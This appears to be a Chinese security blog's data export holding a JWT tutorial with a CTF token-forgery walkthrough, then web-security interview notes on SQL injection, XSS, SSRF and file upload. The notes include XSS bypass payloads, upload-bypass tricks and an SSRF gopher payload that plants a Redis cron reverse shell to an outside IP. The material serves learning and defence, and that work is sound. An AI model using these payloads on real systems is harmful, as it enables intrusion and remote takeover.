></p>\n<p>JWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。</p>\n<h3 id=\"JWT安全隐患\"><a href=\"#JWT安全隐患\" class=\"headerlink\" title=\"JWT安全隐患\"></a>JWT安全隐患</h3><ul>\n<li>修改算法为none</li>\n<li>修改算法从RS256到HS256</li>\n<li>信息泄露 <strong>密钥泄露</strong></li>\n<li>爆破密钥</li>\n</ul>\n<p>这里我们着重说一下<strong>jwt伪造</strong>，这个考点在ctf中经常出现</p>\n<h4 id=\"JWT伪造\"><a href=\"#JWT伪造\" class=\"headerlink\" title=\"JWT伪造\"></a>JWT伪造</h4><p>当我面拿到一串<strong>JWT</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</span><br></pre></td></tr></table></figure>\n\n<p>我们去在线解jwt网站encode <a class=\"link\"   href=\"https://jwt.io/\" >https://jwt.io/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png\"\n                        alt=\"图片-1684742810710\"\n                 ></p>\n<p><strong>所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。</strong></p>\n<p><strong>验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。</strong></p>\n<p><strong>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</strong></p>\n<p><strong>因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查</strong></p>\n<p>我们需要对<strong>secret</strong>进行爆破</p>\n<p>推荐工具  <a class=\"link\"   href=\"https://github.com/brendan-rius/c-jwt-cracker\" >https://github.com/brendan-rius/c-jwt-cracker<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>破解出来的加密密钥key就是：54l7y</strong>，</p>\n<p><strong>现在我们可以任意构造我们想要的jwt</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q</span><br></pre></td></tr></table></figure>\n\n<p>构造成功</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"浅析JWT\"><a href=\"#浅析JWT\" class=\"headerlink\" title=\"浅析JWT\"></a>浅析JWT</h1><h3 id=\"JWT简介\"><a href=\"#JWT简介\" class=\"headerlink\" title=\"JWT简介\"></a>JWT简介</h3><blockquote>\n<p>Json web token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>\n</blockquote>\n<p>我们在学习jwt的同时，也需要了解传统session认证</p>\n<h3 id=\"session认证\"><a href=\"#session认证\" class=\"headerlink\" title=\"session认证\"></a>session认证</h3><blockquote>\n<p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这就是传统的基于session认证。</p>\n</blockquote>\n<p>这种传统的<strong>session</strong>我们很难得到拓展，并且session相关的数据是保存在服务器中，随着用户数量的增加，服务器的载荷也就越大，这时候许多问题就暴露了出来</p>\n<ul>\n<li><strong>Session</strong>：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而<strong>随着认证用户的增多，服务端的开销会明显增大。</strong></li>\n<li><strong>扩展性</strong>：用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上，这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</li>\n<li><strong>CSRF</strong>: 因为是 基于cookie 来进行用户识别的，<strong>cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</strong></li>\n</ul>\n<h3 id=\"JWT与Session的差异\"><a href=\"#JWT与Session的差异\" class=\"headerlink\" title=\"JWT与Session的差异\"></a>JWT与Session的差异</h3><p><strong>相同点</strong>：<strong>它们都是存储用户信息；</strong></p>\n<p><strong>不同点</strong></p>\n<ul>\n<li><p><strong>Session是在服务器端的，而JWT是在客户端的。</strong></p>\n</li>\n<li><p><strong>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</strong></p>\n</li>\n<li><p><strong>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端</strong></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png\"\n                        alt=\"图片-1684742759615\"\n                 ></p>\n<h3 id=\"基于Token的身份认证-与-基于服务器的身份认证\"><a href=\"#基于Token的身份认证-与-基于服务器的身份认证\" class=\"headerlink\" title=\"基于Token的身份认证 与 基于服务器的身份认证\"></a>基于Token的身份认证 与 基于服务器的身份认证</h3><h4 id=\"基于服务器的身份认证\"><a href=\"#基于服务器的身份认证\" class=\"headerlink\" title=\"基于服务器的身份认证\"></a>基于服务器的身份认证</h4><p>在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的：</p>\n<blockquote>\n<p>HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证</p>\n</blockquote>\n<p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p>\n<p>这种基于服务器的身份认证方式存在一些问题：</p>\n<ul>\n<li><strong>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</strong></li>\n<li><strong>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</strong></li>\n<li><strong>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</strong></li>\n<li><strong>CSRF : 用户很容易受到CSRF攻击。</strong></li>\n</ul>\n<h4 id=\"用Token的好处\"><a href=\"#用Token的好处\" class=\"headerlink\" title=\"用Token的好处\"></a>用Token的好处</h4><ul>\n<li><strong>无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。</strong></li>\n<li><strong>安全：Token不是Cookie。（The token, not a  cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话!</strong></li>\n<li><strong>token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。</strong></li>\n</ul>\n<h3 id=\"什么时候用JWT\"><a href=\"#什么时候用JWT\" class=\"headerlink\" title=\"什么时候用JWT\"></a>什么时候用JWT</h3><p>下列场景中使用JSON Web Token是很有用的：</p>\n<ul>\n<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>\n<li><strong>Information Exchange</strong> (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web  Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥&#x2F;私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>\n</ul>\n<h3 id=\"JWT结构\"><a href=\"#JWT结构\" class=\"headerlink\" title=\"JWT结构\"></a>JWT结构</h3><p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>\n<ul>\n<li><strong>Header</strong></li>\n<li><strong>Payload</strong></li>\n<li><strong>Signature</strong></li>\n</ul>\n<p>下面具体来看看每个部分</p>\n<h4 id=\"Header（头部）\"><a href=\"#Header（头部）\" class=\"headerlink\" title=\"Header（头部）\"></a>Header（头部）</h4><p>jwt头部承载两部分信息</p>\n<ul>\n<li><strong>声明类型</strong>：类似于jwt</li>\n<li><strong>声明加密的算法</strong>：通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class=\"line\">  &#x27;alg&#x27;: &#x27;HS256&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后将头部进行<strong>base64加密</strong>得到第一部分</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>可以将JWT中的alg算法修改为none：</strong></p>\n<p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。</strong></p>\n</blockquote>\n<h4 id=\"Payload（载荷）\"><a href=\"#Payload（载荷）\" class=\"headerlink\" title=\"Payload（载荷）\"></a>Payload（载荷）</h4><p>payload<strong>就是存放有效信息的地方</strong>，这些有效信息包含三个部分</p>\n<ul>\n<li><strong>registered</strong> 标准中注册的声明</li>\n<li><strong>public</strong> 公共的声明</li>\n<li><strong>private</strong> 私有的声明</li>\n</ul>\n<p><strong>标签中注册的声明</strong></p>\n<ul>\n<li><strong>iss: jwt签发者</strong></li>\n<li><strong>sub: jwt所面向的用户</strong></li>\n<li><strong>aud: 接收jwt的一方</strong></li>\n<li><strong>exp: jwt的过期时间，这个过期时间必须要大于签发时间</strong></li>\n<li><strong>nbf: 定义在什么时间之前，该jwt都是不可用的.</strong></li>\n<li><strong>iat: jwt的签发时间</strong></li>\n<li><strong>jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</strong></li>\n</ul>\n<p><strong>公共的声明</strong></p>\n<p>公共的声明可以添加任何的信息，一般添加<strong>用户的相关信息</strong>或<strong>其他业务需要的必要信息</strong>。但不建议添加敏感信息，因为该部分在客户端可解密。</p>\n<p><strong>私有的声明</strong></p>\n<p>私有声明<strong>是提供者和消费者所共同定义的声明</strong>，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>\n<p>下面是一个自己定义的<strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class=\"line\">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class=\"line\">  &quot;iat&quot;: 1451888119,</span><br><span class=\"line\">  &quot;exp&quot;: 1454516119,</span><br><span class=\"line\">  &quot;nbf&quot;: 1451888119,</span><br><span class=\"line\">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class=\"line\">  &quot;admin&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>将其base64加密得到jwt第二部分</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>\n</blockquote>\n<h4 id=\"Signature（签证）\"><a href=\"#Signature（签证）\" class=\"headerlink\" title=\"Signature（签证）\"></a>Signature（签证）</h4><p>签证信息由<strong>3个部分组成</strong></p>\n<ul>\n<li><strong>header（base64加密后的）</strong></li>\n<li><strong>payload（base64加密后的）</strong></li>\n<li><strong>secret</strong></li>\n</ul>\n<p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javascript</span><br><span class=\"line\">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class=\"line\"></span><br><span class=\"line\">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。</strong></p>\n</blockquote>\n<h3 id=\"JWT认证过程\"><a href=\"#JWT认证过程\" class=\"headerlink\" title=\"JWT认证过程\"></a>JWT认证过程</h3><p>客户端接受服务器的<strong>JWT</strong>将其存储在<strong>Cookie</strong>或loaclSrorage中。此后，客户端将在与服务器进行交互中都会带JWT。如果它存储在Cookie中，就可以自动发送，但不会跨域，因此一般是将它放在HTTP请求的**<u>Header Authorization</u><strong>字段中当跨域时，也可以将JWT被放置于</strong>POST**请求的数据主体中。</p>\n<p>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>\n<p>一般是在请求头里加入<code>Authorization</code>，并加上<code>Bearer</code>标注：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png\"\n                        alt=\"图片-1684742819251\"\n                 ></p>\n<p>JWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。</p>\n<h3 id=\"JWT安全隐患\"><a href=\"#JWT安全隐患\" class=\"headerlink\" title=\"JWT安全隐患\"></a>JWT安全隐患</h3><ul>\n<li>修改算法为none</li>\n<li>修改算法从RS256到HS256</li>\n<li>信息泄露 <strong>密钥泄露</strong></li>\n<li>爆破密钥</li>\n</ul>\n<p>这里我们着重说一下<strong>jwt伪造</strong>，这个考点在ctf中经常出现</p>\n<h4 id=\"JWT伪造\"><a href=\"#JWT伪造\" class=\"headerlink\" title=\"JWT伪造\"></a>JWT伪造</h4><p>当我面拿到一串<strong>JWT</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</span><br></pre></td></tr></table></figure>\n\n<p>我们去在线解jwt网站encode <a class=\"link\"   href=\"https://jwt.io/\" >https://jwt.io/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png\"\n                        alt=\"图片-1684742810710\"\n                 ></p>\n<p><strong>所以，我们的目的就是把false改成true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。</strong></p>\n<p><strong>验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。</strong></p>\n<p><strong>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</strong></p>\n<p><strong>因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查</strong></p>\n<p>我们需要对<strong>secret</strong>进行爆破</p>\n<p>推荐工具  <a class=\"link\"   href=\"https://github.com/brendan-rius/c-jwt-cracker\" >https://github.com/brendan-rius/c-jwt-cracker<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>破解出来的加密密钥key就是：54l7y</strong>，</p>\n<p><strong>现在我们可以任意构造我们想要的jwt</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q</span><br></pre></td></tr></table></figure>\n\n<p>构造成功</p>\n"},{"title":"面试prepare","date":"2023-04-06T15:33:41.000Z","excerpt":"面试prepare","_content":"\n\n\n# 面试prepare\n\n### 前言\n\n本人最近准备找一份暑期实习，于是自己写了一份面经\n\n写的不好，仅供参考\n\n\n\n### sql注入\n\n#### **常见的关系型数据库**\n\nmysql、sqlserver、oracle、access、sqlite、postgreSQL\n\n- mysql:3306 \n- sqlserver:1433 \n- orecal:1521 \n- PostgreSQL:5432 \n- db2:50000\n\n- MongoDB:27017 \n- redis:6379 \n- memcached:11211\n\n#### **SQL注入有哪几种注入类型？**\n\n从注入参数类型分：数字型注入、字符型注入、搜索型注入 \n从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，\n\n二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）\n\n从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入\n\n\n\n#### **SQL注入的危害及防御**\n\n危害\n\n- 数据库泄露 \n- 数据库被破坏 \n- 网站崩溃 \n- 服务器被植入木马\n\n\n\n防御\n\n- 代码层面对查询参数进行转义 \n- 预编译与参数绑定 \n- 利用WAF防御\n\n\n\n#### sql注入getshell\n\n- 存在SQL注入漏洞\n- web目录具有写入权限\n- 找到网站的绝对路径\n- secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）\n\n\n\n#### 绕过方式\n\n- 大小写\n- 双写\n- 注释符  /**/\n- 编码绕过 %20 %09 %0a\n- 括号绕过\n- 将表明转为十六进制绕过引号\n- join绕过逗号\n- like绕过等于号\n\n\n\n### xss\n\n#### 原理\n\nxss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功\n\n#### 如何验证存在xss漏洞\n\n第一步，寻找用户可控的参数（输入点）\n 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理\n 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过\n\n\n\n#### xss有哪几种类型\n\n##### DOM型XSS\n\n攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。\n\n##### 反射性型XSS\n\n攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。\n\n##### 存储型XSS\n\n攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。\n\n#### xss危害\n\n- 盗用用户的COOKIE\n- 修改DOM\n- 插入广告（黑页等）\n- 发动xss蠕虫攻击\n- 劫持用户行为，进一步渗透内网\n\n#### xss修复\n\n- 在服务端进行输入检测，过滤特殊字符\n- 对输出内容进行编码转义\n- 在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。\n- 设置httponly为true\n\n\n\n#### 绕过\n\n- 双写\n\n- 对不能构造script标签的情况下\n  使用事件进行绕过\n\n  ```\n  <input  value='123' onclick='alert()'>\n  ```\n\n- 超链接绕过\n\n  ```\n  <a src=javascript:alert()>123</a>\n  ```\n\n  \n\n### ssrf\n\n#### 原理\n\n服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n\n#### 危害\n\nSSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n\n\n\n#### 利用方式\n\nSSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。\n\n以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：\n\n```\ncurl -vvv 'dict://127.0.0.1:6379/info'\n \ncurl -vvv 'file:///etc/passwd'\n \n# * 注意: 链接使用单引号，避免$变量问题\n \ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n```\n\n\n\n#### 绕过\n\n采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成\n\n> - 8进制格式：0300.0250.0.1\n>\n> - 16进制格式：0xC0.0xA8.0.1\n>\n> - 10进制整数格式：3232235521\n>\n> - 16进制整数格式：0xC0A80001\n>\n> - 合并后两位：1.1.278 / 1.1.755\n>\n> - 合并后三位：1.278 / 1.755 / 3.14159267\n>\n> - 0.0.0.0这个IP可以直接访问到本地\n>\n> - `xip.io` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，\n>\n>   例如192.168.0.1.xip.io，解析到192.168.0.1。\n\n\n\n#### 防御方式\n\n> - 过滤返回的信息\n> - 统一错误信息\n> - 限制请求的端口\n> - 禁止不常用的协议\n> - 对DNS Rebinding，考虑使用DNS缓存或者Host白名单\n\n1. 限制访问方法只能使用GET\n2. 限制访问的协议只能是http或https，其他协议直接拒绝访问\n3. 检测特殊字符CRLF，存在则直接拒绝访问\n4. 设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验\n5. 解析url中域名对应的ipv4地址：   \n   1. 该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤\n   2. **使用ip对url中的域名进行替换，访问资源时都以ip进行访问**；这样可以防御DNS Rebinding类的攻击\n\n\n\n### 文件上传\n\n#### 基本概念\n\n用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。\n\n    常见的安全问题：\n    （1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。\n    （2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。\n    （3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。\n\n\n![图片-1685330394483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png)\n\n\n\n#### 文件上传漏洞方式\n\n1.客户端方式\n\n主要方式就是JS检查。\n绕过：\n（1）首先选择正常的文件进行上传\n（2）用BurpSuit进行抓包修改后缀然后完成文件上传.\n2.绕过文件上传检查功能\n（1）白名单校对——%00截断\n\n因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。\n原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。\n\n\n\n#### 绕过\n\n##### .htaccess文件\n\n> htaccess 在站点的根目录下面，不是在[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)目录下，但是它属于apache的一个配置文件\n\n其中.htaccess文件内容：SetHandler application/x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错\n\n\n\n##### 